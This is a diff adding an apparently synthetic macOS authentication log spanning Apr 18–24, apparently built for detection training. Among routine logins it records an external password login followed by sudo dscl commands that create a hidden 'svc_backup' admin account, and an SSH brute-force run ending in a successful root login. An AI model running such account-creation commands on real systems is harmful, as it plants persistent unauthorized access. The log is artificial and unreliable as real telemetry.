@@ -1,0 +1,247 @@
+Apr 18 12:15:51 mac-mini-server loginwindow[123]: USER_PROCESS: 502 kchen
+Apr 18 12:32:42 macbook-air-mwilliams sshd[4150]: Accepted publickey for scarter from 10.0.2.205 port 42279 ssh2
+Apr 18 12:39:51 mac-mini-server authd[456]: Succeeded authorizing right 'system.preferences' for authorization created by '/System/Applications/System Settings.app' (uid 500)
+Apr 18 12:43:55 macbook-pro-kchen authd[456]: Succeeded authorizing right 'system.preferences' for authorization created by '/System/Applications/System Settings.app' (uid 504)
+Apr 18 13:09:24 imac-finance-01 loginwindow[123]: Authentication failed for user apatel
+Apr 18 13:13:11 macbook-pro-kchen sshd[8019]: Accepted publickey for ngreen from 10.0.2.139 port 59121 ssh2
+Apr 18 13:14:53 macbook-pro-jsmith loginwindow[123]: USER_PROCESS: 502 rgarcia
+Apr 18 13:29:55 macbook-pro-jsmith loginwindow[123]: USER_PROCESS: 502 mwilliams
+Apr 18 14:07:50 mac-mini-server loginwindow[123]: USER_PROCESS: 502 dmiller
+Apr 18 14:11:28 macbook-pro-jsmith loginwindow[123]: USER_PROCESS: 502 tjohnson
+Apr 18 14:31:32 macbook-pro-kchen loginwindow[123]: USER_PROCESS: 502 scarter
+Apr 18 14:56:58 macbook-air-mwilliams loginwindow[123]: USER_PROCESS: 502 rgarcia
+Apr 18 15:01:37 macbook-air-mwilliams sudo[8517]: scarter : TTY=ttys000 ; PWD=/Users/scarter ; USER=root ; COMMAND=/usr/bin/softwareupdate -l
+Apr 18 15:03:18 macbook-pro-jsmith sudo[6977]: rgarcia : TTY=ttys000 ; PWD=/Users/rgarcia ; USER=root ; COMMAND=/usr/bin/softwareupdate -l
+Apr 18 15:56:24 macbook-air-mwilliams loginwindow[123]: Authentication failed for user dmiller
+Apr 18 16:11:06 macbook-pro-jsmith authd[456]: Succeeded authorizing right 'system.preferences' for authorization created by '/System/Applications/System Settings.app' (uid 502)
+Apr 18 16:49:19 imac-finance-01 authd[456]: Succeeded authorizing right 'system.preferences' for authorization created by '/System/Applications/System Settings.app' (uid 502)
+Apr 18 17:03:46 macbook-pro-kchen authd[456]: Succeeded authorizing right 'system.preferences' for authorization created by '/System/Applications/System Settings.app' (uid 501)
+Apr 18 17:15:23 imac-finance-01 authd[456]: Succeeded authorizing right 'system.preferences' for authorization created by '/System/Applications/System Settings.app' (uid 505)
+Apr 18 17:22:02 macbook-pro-kchen sudo[9797]: dmiller : TTY=ttys000 ; PWD=/Users/dmiller ; USER=root ; COMMAND=/usr/bin/softwareupdate -l
+Apr 18 17:41:24 mac-mini-server loginwindow[123]: Authentication failed for user ngreen
+Apr 18 20:17:55 macbook-pro-jsmith loginwindow[123]: USER_PROCESS: 502 jsmith
+Apr 18 21:00:38 macbook-pro-jsmith authd[456]: Succeeded authorizing right 'system.preferences' for authorization created by '/System/Applications/System Settings.app' (uid 504)
+Apr 18 21:17:17 macbook-pro-kchen loginwindow[123]: USER_PROCESS: 502 ngreen
+Apr 19 11:16:47 macbook-air-mwilliams authd[456]: Succeeded authorizing right 'system.preferences' for authorization created by '/System/Applications/System Settings.app' (uid 508)
+Apr 19 11:29:29 macbook-pro-jsmith sshd[2113]: Accepted publickey for kchen from 10.0.3.36 port 47707 ssh2
+Apr 19 12:02:20 macbook-pro-kchen sshd[7049]: Accepted publickey for kchen from 10.0.3.72 port 59087 ssh2
+Apr 19 12:31:37 macbook-air-mwilliams sudo[5002]: ngreen : TTY=ttys000 ; PWD=/Users/ngreen ; USER=root ; COMMAND=/usr/bin/softwareupdate -l
+Apr 19 12:53:40 macbook-pro-kchen sudo[8119]: kchen : TTY=ttys000 ; PWD=/Users/kchen ; USER=root ; COMMAND=/usr/bin/softwareupdate -l
+Apr 19 13:13:31 macbook-pro-kchen sshd[5462]: Accepted publickey for mwilliams from 10.0.5.32 port 49232 ssh2
+Apr 19 13:26:17 macbook-air-mwilliams loginwindow[123]: USER_PROCESS: 502 ngreen
+Apr 19 14:13:49 macbook-air-mwilliams loginwindow[123]: USER_PROCESS: 502 kchen
+Apr 19 14:24:06 imac-finance-01 sudo[9977]: lwong : TTY=ttys000 ; PWD=/Users/lwong ; USER=root ; COMMAND=/usr/bin/softwareupdate -l
+Apr 19 14:24:24 macbook-pro-kchen loginwindow[123]: Authentication failed for user scarter
+Apr 19 14:50:22 macbook-air-mwilliams sshd[4728]: Accepted publickey for dmiller from 10.0.5.16 port 47304 ssh2
+Apr 19 14:59:24 imac-finance-01 loginwindow[123]: USER_PROCESS: 502 tjohnson
+Apr 19 17:18:41 macbook-air-mwilliams loginwindow[123]: USER_PROCESS: 502 mwilliams
+Apr 19 17:35:56 mac-mini-server loginwindow[123]: USER_PROCESS: 502 mwilliams
+Apr 19 18:40:24 macbook-pro-kchen loginwindow[123]: Authentication failed for user rgarcia
+Apr 19 19:57:15 imac-finance-01 sudo[6409]: ngreen : TTY=ttys000 ; PWD=/Users/ngreen ; USER=root ; COMMAND=/usr/bin/softwareupdate -l
+Apr 19 20:35:26 macbook-pro-jsmith sudo[5272]: scarter : TTY=ttys000 ; PWD=/Users/scarter ; USER=root ; COMMAND=/usr/bin/softwareupdate -l
+Apr 19 20:44:33 imac-finance-01 authd[456]: Succeeded authorizing right 'system.preferences' for authorization created by '/System/Applications/System Settings.app' (uid 505)
+Apr 19 20:44:58 macbook-air-mwilliams sshd[1821]: Accepted publickey for jsmith from 10.0.3.72 port 59142 ssh2
+Apr 19 21:17:24 mac-mini-server loginwindow[123]: Authentication failed for user dmiller
+Apr 19 21:38:18 macbook-pro-kchen authd[456]: Succeeded authorizing right 'system.preferences' for authorization created by '/System/Applications/System Settings.app' (uid 510)
+Apr 19 21:51:31 macbook-pro-kchen sshd[7691]: Accepted publickey for apatel from 10.0.5.16 port 50688 ssh2
+Apr 19 21:53:11 macbook-air-mwilliams sshd[2771]: Accepted publickey for rgarcia from 10.0.5.118 port 52535 ssh2
+Apr 20 12:30:05 macbook-pro-jsmith authd[456]: Succeeded authorizing right 'system.preferences' for authorization created by '/System/Applications/System Settings.app' (uid 505)
+Apr 20 13:24:35 macbook-air-mwilliams sudo[8616]: ngreen : TTY=ttys000 ; PWD=/Users/ngreen ; USER=root ; COMMAND=/usr/bin/softwareupdate -l
+Apr 20 13:39:29 macbook-pro-kchen sudo[4848]: apatel : TTY=ttys000 ; PWD=/Users/apatel ; USER=root ; COMMAND=/usr/bin/softwareupdate -l
+Apr 20 13:42:37 mac-mini-server loginwindow[123]: USER_PROCESS: 502 mwilliams
+Apr 20 14:09:15 mac-mini-server authd[456]: Succeeded authorizing right 'system.preferences' for authorization created by '/System/Applications/System Settings.app' (uid 502)
+Apr 20 14:48:36 macbook-pro-jsmith authd[456]: Succeeded authorizing right 'system.preferences' for authorization created by '/System/Applications/System Settings.app' (uid 507)
+Apr 20 14:50:25 imac-finance-01 sshd[3068]: Accepted publickey for scarter from 10.0.1.65 port 55517 ssh2
+Apr 20 14:50:50 macbook-pro-kchen sudo[1096]: lwong : TTY=ttys000 ; PWD=/Users/lwong ; USER=root ; COMMAND=/usr/bin/softwareupdate -l
+Apr 20 14:57:24 imac-finance-01 loginwindow[123]: Authentication failed for user ngreen
+Apr 20 14:59:24 macbook-pro-kchen loginwindow[123]: Authentication failed for user jsmith
+Apr 20 15:11:31 macbook-air-mwilliams authd[456]: Succeeded authorizing right 'system.preferences' for authorization created by '/System/Applications/System Settings.app' (uid 503)
+Apr 20 15:12:41 macbook-air-mwilliams authd[456]: Succeeded authorizing right 'system.preferences' for authorization created by '/System/Applications/System Settings.app' (uid 503)
+Apr 20 15:34:07 mac-mini-server sudo[4978]: lwong : TTY=ttys000 ; PWD=/Users/lwong ; USER=root ; COMMAND=/usr/bin/softwareupdate -l
+Apr 20 15:44:01 macbook-pro-kchen sudo[5853]: ngreen : TTY=ttys000 ; PWD=/Users/ngreen ; USER=root ; COMMAND=/usr/bin/softwareupdate -l
+Apr 20 16:51:39 macbook-air-mwilliams loginwindow[123]: USER_PROCESS: 502 mwilliams
+Apr 20 17:17:37 macbook-air-mwilliams loginwindow[123]: USER_PROCESS: 502 dmiller
+Apr 20 17:52:21 macbook-pro-kchen authd[456]: Succeeded authorizing right 'system.preferences' for authorization created by '/System/Applications/System Settings.app' (uid 504)
+Apr 20 17:58:48 mac-mini-server authd[456]: Succeeded authorizing right 'system.preferences' for authorization created by '/System/Applications/System Settings.app' (uid 500)
+Apr 20 17:59:11 macbook-pro-jsmith sshd[4673]: Accepted publickey for ngreen from 10.0.5.117 port 42248 ssh2
+Apr 20 18:25:40 macbook-air-mwilliams loginwindow[123]: USER_PROCESS: 502 rgarcia
+Apr 20 18:32:57 mac-mini-server sudo[8434]: tjohnson : TTY=ttys000 ; PWD=/Users/tjohnson ; USER=root ; COMMAND=/usr/bin/softwareupdate -l
+Apr 20 18:41:40 imac-finance-01 loginwindow[123]: USER_PROCESS: 502 tjohnson
+Apr 20 18:47:25 macbook-air-mwilliams sudo[6016]: mwilliams : TTY=ttys000 ; PWD=/Users/mwilliams ; USER=root ; COMMAND=/usr/bin/softwareupdate -l
+Apr 20 18:51:44 mac-mini-server sudo[6576]: kchen : TTY=ttys000 ; PWD=/Users/kchen ; USER=root ; COMMAND=/usr/bin/softwareupdate -l
+Apr 20 18:57:57 macbook-pro-jsmith authd[456]: Succeeded authorizing right 'system.preferences' for authorization created by '/System/Applications/System Settings.app' (uid 507)
+Apr 20 20:34:06 macbook-pro-jsmith sudo[3977]: jsmith : TTY=ttys000 ; PWD=/Users/jsmith ; USER=root ; COMMAND=/usr/bin/softwareupdate -l
+Apr 20 21:30:59 macbook-air-mwilliams sshd[9270]: Accepted publickey for scarter from 10.0.1.204 port 53983 ssh2
+Apr 20 21:33:36 mac-mini-server authd[456]: Succeeded authorizing right 'system.preferences' for authorization created by '/System/Applications/System Settings.app' (uid 501)
+Apr 20 21:36:15 macbook-pro-kchen sudo[8018]: mwilliams : TTY=ttys000 ; PWD=/Users/mwilliams ; USER=root ; COMMAND=/usr/bin/softwareupdate -l
+Apr 21 11:43:33 imac-finance-01 authd[456]: Succeeded authorizing right 'system.preferences' for authorization created by '/System/Applications/System Settings.app' (uid 509)
+Apr 21 12:15:13 macbook-air-mwilliams authd[456]: Succeeded authorizing right 'system.preferences' for authorization created by '/System/Applications/System Settings.app' (uid 504)
+Apr 21 12:24:24 macbook-pro-jsmith loginwindow[123]: Authentication failed for user mwilliams
+Apr 21 12:40:38 macbook-pro-kchen sshd[7965]: Accepted publickey for apatel from 10.0.1.17 port 43760 ssh2
+Apr 21 13:00:40 macbook-pro-jsmith loginwindow[123]: USER_PROCESS: 502 dmiller
+Apr 21 13:07:15 macbook-air-mwilliams sshd[5066]: Accepted publickey for scarter from 10.0.2.45 port 43881 ssh2
+Apr 21 13:18:50 macbook-air-mwilliams sudo[2442]: dmiller : TTY=ttys000 ; PWD=/Users/dmiller ; USER=root ; COMMAND=/usr/bin/softwareupdate -l
+Apr 21 13:25:58 macbook-air-mwilliams sshd[9903]: Accepted publickey for dmiller from 10.0.5.60 port 52360 ssh2
+Apr 21 13:38:19 macbook-pro-jsmith sudo[8843]: dmiller : TTY=ttys000 ; PWD=/Users/dmiller ; USER=root ; COMMAND=/usr/bin/softwareupdate -l
+Apr 21 14:33:48 mac-mini-server sshd[6213]: Accepted publickey for rgarcia from 10.0.3.72 port 55498 ssh2
+Apr 21 14:37:37 macbook-pro-jsmith loginwindow[123]: USER_PROCESS: 502 apatel
+Apr 21 15:49:33 macbook-pro-jsmith loginwindow[123]: USER_PROCESS: 502 mwilliams
+Apr 21 16:05:13 macbook-pro-kchen sshd[9889]: Accepted publickey for lwong from 10.0.1.16 port 55138 ssh2
+Apr 21 17:26:08 mac-mini-server authd[456]: Succeeded authorizing right 'system.preferences' for authorization created by '/System/Applications/System Settings.app' (uid 504)
+Apr 21 17:44:44 macbook-air-mwilliams sudo[1339]: scarter : TTY=ttys000 ; PWD=/Users/scarter ; USER=root ; COMMAND=/usr/bin/softwareupdate -l
+Apr 21 17:50:54 imac-finance-01 sshd[3369]: Accepted publickey for dmiller from 10.0.1.204 port 52569 ssh2
+Apr 21 17:59:32 macbook-pro-kchen authd[456]: Succeeded authorizing right 'system.preferences' for authorization created by '/System/Applications/System Settings.app' (uid 508)
+Apr 21 18:41:43 macbook-air-mwilliams loginwindow[123]: USER_PROCESS: 502 lwong
+Apr 21 18:54:08 macbook-pro-jsmith loginwindow[123]: USER_PROCESS: 502 dmiller
+Apr 21 19:21:03 mac-mini-server sudo[9998]: dmiller : TTY=ttys000 ; PWD=/Users/dmiller ; USER=root ; COMMAND=/usr/bin/softwareupdate -l
+Apr 21 19:21:52 macbook-air-mwilliams loginwindow[123]: USER_PROCESS: 502 dmiller
+Apr 21 19:23:29 macbook-pro-jsmith sudo[9165]: rgarcia : TTY=ttys000 ; PWD=/Users/rgarcia ; USER=root ; COMMAND=/usr/bin/softwareupdate -l
+Apr 21 20:00:12 mac-mini-server authd[456]: Succeeded authorizing right 'system.preferences' for authorization created by '/System/Applications/System Settings.app' (uid 509)
+Apr 21 21:03:18 macbook-pro-kchen loginwindow[123]: USER_PROCESS: 502 tjohnson
+Apr 21 21:40:24 imac-finance-01 loginwindow[123]: Authentication failed for user apatel
+Apr 21 21:49:55 mac-mini-server loginwindow[123]: USER_PROCESS: 502 mwilliams
+Apr 22 06:09:24 mac-mini-server sshd[4421]: Accepted password for jsmith from 45.142.214.89 port 52341 ssh2
+Apr 22 06:11:24 mac-mini-server sudo[4422]: jsmith : TTY=pts/0 ; PWD=/Users/jsmith ; USER=root ; COMMAND=/usr/bin/dscl . -create /Users/svc_backup
+Apr 22 06:12:24 mac-mini-server sudo[4423]: jsmith : TTY=pts/0 ; PWD=/Users/jsmith ; USER=root ; COMMAND=/usr/bin/dscl . -append /Groups/admin GroupMembership svc_backup
+Apr 22 12:05:26 macbook-air-mwilliams sshd[2902]: Accepted publickey for jsmith from 10.0.2.188 port 43184 ssh2
+Apr 22 12:07:12 mac-mini-server sudo[7464]: rgarcia : TTY=ttys000 ; PWD=/Users/rgarcia ; USER=root ; COMMAND=/usr/bin/softwareupdate -l
+Apr 22 12:50:24 macbook-pro-jsmith loginwindow[123]: Authentication failed for user mwilliams
+Apr 22 12:51:12 imac-finance-01 loginwindow[123]: USER_PROCESS: 502 ngreen
+Apr 22 13:03:22 macbook-air-mwilliams sudo[3165]: apatel : TTY=ttys000 ; PWD=/Users/apatel ; USER=root ; COMMAND=/usr/bin/softwareupdate -l
+Apr 22 13:12:57 macbook-pro-kchen authd[456]: Succeeded authorizing right 'system.preferences' for authorization created by '/System/Applications/System Settings.app' (uid 509)
+Apr 22 13:40:24 macbook-pro-jsmith loginwindow[123]: Authentication failed for user dmiller
+Apr 22 13:41:43 macbook-pro-jsmith authd[456]: Succeeded authorizing right 'system.preferences' for authorization created by '/System/Applications/System Settings.app' (uid 505)
+Apr 22 15:00:08 imac-finance-01 sudo[6942]: tjohnson : TTY=ttys000 ; PWD=/Users/tjohnson ; USER=root ; COMMAND=/usr/bin/softwareupdate -l
+Apr 22 15:37:04 macbook-pro-kchen authd[456]: Succeeded authorizing right 'system.preferences' for authorization created by '/System/Applications/System Settings.app' (uid 504)
+Apr 22 15:51:33 macbook-pro-kchen loginwindow[123]: USER_PROCESS: 502 kchen
+Apr 22 16:48:14 macbook-pro-kchen sshd[1258]: Accepted publickey for rgarcia from 10.0.5.60 port 45709 ssh2
+Apr 22 16:49:53 mac-mini-server sudo[6120]: lwong : TTY=ttys000 ; PWD=/Users/lwong ; USER=root ; COMMAND=/usr/bin/softwareupdate -l
+Apr 22 17:03:24 imac-finance-01 loginwindow[123]: Authentication failed for user tjohnson
+Apr 22 17:26:47 mac-mini-server authd[456]: Succeeded authorizing right 'system.preferences' for authorization created by '/System/Applications/System Settings.app' (uid 507)
+Apr 22 17:30:31 mac-mini-server sshd[6931]: Accepted publickey for mwilliams from 10.0.1.204 port 56817 ssh2
+Apr 22 17:33:46 macbook-air-mwilliams loginwindow[123]: USER_PROCESS: 502 scarter
+Apr 22 17:59:03 macbook-air-mwilliams authd[456]: Succeeded authorizing right 'system.preferences' for authorization created by '/System/Applications/System Settings.app' (uid 504)
+Apr 22 19:04:53 macbook-air-mwilliams sshd[7242]: Accepted publickey for tjohnson from 10.0.2.205 port 52172 ssh2
+Apr 22 19:30:22 imac-finance-01 authd[456]: Succeeded authorizing right 'system.preferences' for authorization created by '/System/Applications/System Settings.app' (uid 501)
+Apr 22 19:35:51 macbook-pro-jsmith authd[456]: Succeeded authorizing right 'system.preferences' for authorization created by '/System/Applications/System Settings.app' (uid 503)
+Apr 22 19:55:05 macbook-pro-jsmith loginwindow[123]: USER_PROCESS: 502 tjohnson
+Apr 22 20:00:10 macbook-air-mwilliams authd[456]: Succeeded authorizing right 'system.preferences' for authorization created by '/System/Applications/System Settings.app' (uid 506)
+Apr 22 20:40:39 macbook-pro-kchen sudo[5161]: dmiller : TTY=ttys000 ; PWD=/Users/dmiller ; USER=root ; COMMAND=/usr/bin/softwareupdate -l
+Apr 22 20:44:55 imac-finance-01 sudo[4115]: apatel : TTY=ttys000 ; PWD=/Users/apatel ; USER=root ; COMMAND=/usr/bin/softwareupdate -l
+Apr 22 20:58:21 macbook-air-mwilliams sudo[8237]: dmiller : TTY=ttys000 ; PWD=/Users/dmiller ; USER=root ; COMMAND=/usr/bin/softwareupdate -l
+Apr 22 21:03:55 macbook-pro-jsmith sshd[6277]: Accepted publickey for dmiller from 10.0.2.45 port 59932 ssh2
+Apr 22 21:11:05 macbook-pro-jsmith sshd[6464]: Accepted publickey for scarter from 10.0.3.72 port 47981 ssh2
+Apr 22 21:25:08 mac-mini-server sshd[4263]: Accepted publickey for apatel from 10.0.5.16 port 52605 ssh2
+Apr 22 21:46:10 macbook-pro-jsmith sudo[1546]: kchen : TTY=ttys000 ; PWD=/Users/kchen ; USER=root ; COMMAND=/usr/bin/softwareupdate -l
+Apr 23 05:12:24 mac-mini-server sshd[5961]: Failed password for admin from 185.220.101.45 port 57481 ssh2
+Apr 23 05:12:32 mac-mini-server sshd[9234]: Failed password for root from 185.220.101.45 port 45525 ssh2
+Apr 23 05:12:40 mac-mini-server sshd[3526]: Failed password for oracle from 185.220.101.45 port 45609 ssh2
+Apr 23 05:12:48 mac-mini-server sshd[6531]: Failed password for postgres from 185.220.101.45 port 58468 ssh2
+Apr 23 05:12:56 mac-mini-server sshd[1464]: Failed password for root from 185.220.101.45 port 42661 ssh2
+Apr 23 05:13:04 mac-mini-server sshd[5336]: Failed password for root from 185.220.101.45 port 46907 ssh2
+Apr 23 05:13:12 mac-mini-server sshd[7825]: Failed password for jsmith from 185.220.101.45 port 40992 ssh2
+Apr 23 05:13:20 mac-mini-server sshd[9938]: Failed password for test from 185.220.101.45 port 49491 ssh2
+Apr 23 05:13:28 mac-mini-server sshd[5949]: Failed password for postgres from 185.220.101.45 port 55825 ssh2
+Apr 23 05:13:36 mac-mini-server sshd[7653]: Failed password for admin from 185.220.101.45 port 49746 ssh2
+Apr 23 05:13:44 mac-mini-server sshd[2195]: Failed password for test from 185.220.101.45 port 41963 ssh2
+Apr 23 05:13:52 mac-mini-server sshd[8202]: Failed password for admin from 185.220.101.45 port 53619 ssh2
+Apr 23 05:14:00 mac-mini-server sshd[8609]: Failed password for test from 185.220.101.45 port 46685 ssh2
+Apr 23 05:14:08 mac-mini-server sshd[3353]: Failed password for administrator from 185.220.101.45 port 50242 ssh2
+Apr 23 05:14:16 mac-mini-server sshd[6231]: Failed password for jsmith from 185.220.101.45 port 51317 ssh2
+Apr 23 05:14:24 mac-mini-server sshd[3142]: Failed password for test from 185.220.101.45 port 52141 ssh2
+Apr 23 05:14:32 mac-mini-server sshd[2739]: Failed password for oracle from 185.220.101.45 port 50456 ssh2
+Apr 23 05:14:40 mac-mini-server sshd[8642]: Failed password for admin from 185.220.101.45 port 44014 ssh2
+Apr 23 05:14:48 mac-mini-server sshd[8366]: Failed password for administrator from 185.220.101.45 port 48123 ssh2
+Apr 23 05:14:56 mac-mini-server sshd[2586]: Failed password for admin from 185.220.101.45 port 41658 ssh2
+Apr 23 05:15:04 mac-mini-server sshd[7293]: Failed password for administrator from 185.220.101.45 port 53701 ssh2
+Apr 23 05:15:12 mac-mini-server sshd[3616]: Failed password for admin from 185.220.101.45 port 50729 ssh2
+Apr 23 05:15:20 mac-mini-server sshd[6123]: Failed password for oracle from 185.220.101.45 port 46220 ssh2
+Apr 23 05:15:28 mac-mini-server sshd[3610]: Failed password for jsmith from 185.220.101.45 port 56327 ssh2
+Apr 23 05:15:36 mac-mini-server sshd[8648]: Failed password for oracle from 185.220.101.45 port 56343 ssh2
+Apr 23 05:15:44 mac-mini-server sshd[9148]: Failed password for administrator from 185.220.101.45 port 40759 ssh2
+Apr 23 05:15:52 mac-mini-server sshd[7442]: Failed password for root from 185.220.101.45 port 56562 ssh2
+Apr 23 05:16:00 mac-mini-server sshd[4944]: Failed password for test from 185.220.101.45 port 47049 ssh2
+Apr 23 05:16:08 mac-mini-server sshd[6781]: Failed password for oracle from 185.220.101.45 port 41594 ssh2
+Apr 23 05:16:16 mac-mini-server sshd[5609]: Failed password for root from 185.220.101.45 port 56216 ssh2
+Apr 23 05:16:24 mac-mini-server sshd[8710]: Failed password for oracle from 185.220.101.45 port 49363 ssh2
+Apr 23 05:16:32 mac-mini-server sshd[1133]: Failed password for oracle from 185.220.101.45 port 43522 ssh2
+Apr 23 05:16:40 mac-mini-server sshd[3194]: Failed password for test from 185.220.101.45 port 48666 ssh2
+Apr 23 05:16:48 mac-mini-server sshd[6992]: Failed password for postgres from 185.220.101.45 port 53213 ssh2
+Apr 23 05:16:56 mac-mini-server sshd[1741]: Failed password for administrator from 185.220.101.45 port 53126 ssh2
+Apr 23 05:17:04 mac-mini-server sshd[4189]: Failed password for root from 185.220.101.45 port 51879 ssh2
+Apr 23 05:17:12 mac-mini-server sshd[5728]: Failed password for oracle from 185.220.101.45 port 42409 ssh2
+Apr 23 05:17:20 mac-mini-server sshd[9261]: Failed password for test from 185.220.101.45 port 54757 ssh2
+Apr 23 05:17:28 mac-mini-server sshd[5582]: Failed password for jsmith from 185.220.101.45 port 43893 ssh2
+Apr 23 05:17:36 mac-mini-server sshd[2584]: Failed password for admin from 185.220.101.45 port 52907 ssh2
+Apr 23 05:17:44 mac-mini-server sshd[6555]: Failed password for administrator from 185.220.101.45 port 58279 ssh2
+Apr 23 05:17:52 mac-mini-server sshd[3363]: Failed password for administrator from 185.220.101.45 port 46522 ssh2
+Apr 23 05:18:00 mac-mini-server sshd[9341]: Failed password for oracle from 185.220.101.45 port 53152 ssh2
+Apr 23 05:18:08 mac-mini-server sshd[1659]: Failed password for oracle from 185.220.101.45 port 41484 ssh2
+Apr 23 05:18:16 mac-mini-server sshd[3245]: Failed password for root from 185.220.101.45 port 50913 ssh2
+Apr 23 05:18:54 mac-mini-server sshd[5567]: Accepted password for root from 185.220.101.45 port 44521 ssh2
+Apr 23 11:08:41 macbook-air-mwilliams authd[456]: Succeeded authorizing right 'system.preferences' for authorization created by '/System/Applications/System Settings.app' (uid 509)
+Apr 23 11:25:30 macbook-pro-jsmith authd[456]: Succeeded authorizing right 'system.preferences' for authorization created by '/System/Applications/System Settings.app' (uid 507)
+Apr 23 11:29:11 imac-finance-01 sudo[4770]: lwong : TTY=ttys000 ; PWD=/Users/lwong ; USER=root ; COMMAND=/usr/bin/softwareupdate -l
+Apr 23 11:34:59 macbook-air-mwilliams sudo[7929]: ngreen : TTY=ttys000 ; PWD=/Users/ngreen ; USER=root ; COMMAND=/usr/bin/softwareupdate -l
+Apr 23 12:07:11 macbook-pro-jsmith sudo[7878]: jsmith : TTY=ttys000 ; PWD=/Users/jsmith ; USER=root ; COMMAND=/usr/bin/softwareupdate -l
+Apr 23 12:23:19 mac-mini-server authd[456]: Succeeded authorizing right 'system.preferences' for authorization created by '/System/Applications/System Settings.app' (uid 509)
+Apr 23 12:30:13 macbook-pro-kchen sshd[6517]: Accepted publickey for ngreen from 10.0.3.72 port 44294 ssh2
+Apr 23 13:20:43 macbook-pro-kchen loginwindow[123]: USER_PROCESS: 502 tjohnson
+Apr 23 13:25:28 mac-mini-server loginwindow[123]: USER_PROCESS: 502 dmiller
+Apr 23 13:49:24 macbook-pro-kchen loginwindow[123]: Authentication failed for user rgarcia
+Apr 23 13:51:08 imac-finance-01 sshd[1715]: Accepted publickey for scarter from 10.0.1.204 port 53463 ssh2
+Apr 23 13:52:24 macbook-pro-jsmith loginwindow[123]: Authentication failed for user apatel
+Apr 23 15:08:37 mac-mini-server sudo[3538]: tjohnson : TTY=ttys000 ; PWD=/Users/tjohnson ; USER=root ; COMMAND=/usr/bin/softwareupdate -l
+Apr 23 15:26:52 macbook-pro-jsmith authd[456]: Succeeded authorizing right 'system.preferences' for authorization created by '/System/Applications/System Settings.app' (uid 509)
+Apr 23 16:02:51 imac-finance-01 sudo[2288]: mwilliams : TTY=ttys000 ; PWD=/Users/mwilliams ; USER=root ; COMMAND=/usr/bin/softwareupdate -l
+Apr 23 16:03:01 macbook-air-mwilliams authd[456]: Succeeded authorizing right 'system.preferences' for authorization created by '/System/Applications/System Settings.app' (uid 504)
+Apr 23 16:11:45 macbook-pro-jsmith sudo[9355]: kchen : TTY=ttys000 ; PWD=/Users/kchen ; USER=root ; COMMAND=/usr/bin/softwareupdate -l
+Apr 23 16:24:31 macbook-pro-kchen authd[456]: Succeeded authorizing right 'system.preferences' for authorization created by '/System/Applications/System Settings.app' (uid 503)
+Apr 23 16:44:16 imac-finance-01 sshd[3399]: Accepted publickey for kchen from 10.0.1.183 port 48387 ssh2
+Apr 23 16:51:59 macbook-pro-jsmith sudo[1430]: tjohnson : TTY=ttys000 ; PWD=/Users/tjohnson ; USER=root ; COMMAND=/usr/bin/softwareupdate -l
+Apr 23 17:29:24 mac-mini-server loginwindow[123]: Authentication failed for user ngreen
+Apr 23 18:34:59 mac-mini-server sshd[4084]: Accepted publickey for jsmith from 10.0.2.205 port 50535 ssh2
+Apr 23 18:36:42 imac-finance-01 sudo[8684]: dmiller : TTY=ttys000 ; PWD=/Users/dmiller ; USER=root ; COMMAND=/usr/bin/softwareupdate -l
+Apr 23 19:31:03 macbook-air-mwilliams loginwindow[123]: USER_PROCESS: 502 kchen
+Apr 23 20:00:24 macbook-air-mwilliams loginwindow[123]: USER_PROCESS: 502 rgarcia
+Apr 23 20:16:46 macbook-pro-kchen loginwindow[123]: USER_PROCESS: 502 mwilliams
+Apr 23 20:23:09 macbook-air-mwilliams authd[456]: Succeeded authorizing right 'system.preferences' for authorization created by '/System/Applications/System Settings.app' (uid 502)
+Apr 23 20:25:24 macbook-air-mwilliams loginwindow[123]: Authentication failed for user dmiller
+Apr 23 21:01:35 mac-mini-server sudo[6295]: dmiller : TTY=ttys000 ; PWD=/Users/dmiller ; USER=root ; COMMAND=/usr/bin/softwareupdate -l
+Apr 23 21:02:41 mac-mini-server loginwindow[123]: USER_PROCESS: 502 dmiller
+Apr 23 21:38:45 macbook-air-mwilliams sshd[7333]: Accepted publickey for mwilliams from 10.0.1.183 port 49310 ssh2
+Apr 23 21:47:45 macbook-pro-kchen sudo[6928]: kchen : TTY=ttys000 ; PWD=/Users/kchen ; USER=root ; COMMAND=/usr/bin/softwareupdate -l
+Apr 24 12:05:17 macbook-pro-kchen sudo[4963]: dmiller : TTY=ttys000 ; PWD=/Users/dmiller ; USER=root ; COMMAND=/usr/bin/softwareupdate -l
+Apr 24 12:30:58 macbook-pro-kchen authd[456]: Succeeded authorizing right 'system.preferences' for authorization created by '/System/Applications/System Settings.app' (uid 500)
+Apr 24 12:33:32 macbook-air-mwilliams loginwindow[123]: USER_PROCESS: 502 ngreen
+Apr 24 12:46:42 macbook-air-mwilliams authd[456]: Succeeded authorizing right 'system.preferences' for authorization created by '/System/Applications/System Settings.app' (uid 510)
+Apr 24 12:59:46 macbook-air-mwilliams loginwindow[123]: USER_PROCESS: 502 ngreen
+Apr 24 13:16:24 imac-finance-01 loginwindow[123]: Authentication failed for user kchen
+Apr 24 13:28:57 macbook-pro-kchen sudo[8311]: lwong : TTY=ttys000 ; PWD=/Users/lwong ; USER=root ; COMMAND=/usr/bin/softwareupdate -l
+Apr 24 13:54:17 macbook-pro-kchen loginwindow[123]: USER_PROCESS: 502 ngreen
+Apr 24 15:09:24 macbook-air-mwilliams loginwindow[123]: Authentication failed for user ngreen
+Apr 24 16:03:29 macbook-air-mwilliams authd[456]: Succeeded authorizing right 'system.preferences' for authorization created by '/System/Applications/System Settings.app' (uid 502)
+Apr 24 16:14:11 macbook-air-mwilliams sudo[2698]: jsmith : TTY=ttys000 ; PWD=/Users/jsmith ; USER=root ; COMMAND=/usr/bin/softwareupdate -l
+Apr 24 16:25:20 mac-mini-server sudo[9129]: lwong : TTY=ttys000 ; PWD=/Users/lwong ; USER=root ; COMMAND=/usr/bin/softwareupdate -l
+Apr 24 16:25:26 macbook-pro-kchen authd[456]: Succeeded authorizing right 'system.preferences' for authorization created by '/System/Applications/System Settings.app' (uid 510)
+Apr 24 16:29:38 imac-finance-01 sudo[1430]: mwilliams : TTY=ttys000 ; PWD=/Users/mwilliams ; USER=root ; COMMAND=/usr/bin/softwareupdate -l
+Apr 24 16:30:15 macbook-pro-jsmith sshd[8179]: Accepted publickey for kchen from 10.0.5.32 port 41140 ssh2
+Apr 24 16:33:23 macbook-pro-kchen authd[456]: Succeeded authorizing right 'system.preferences' for authorization created by '/System/Applications/System Settings.app' (uid 504)
+Apr 24 16:56:24 macbook-air-mwilliams loginwindow[123]: Authentication failed for user rgarcia
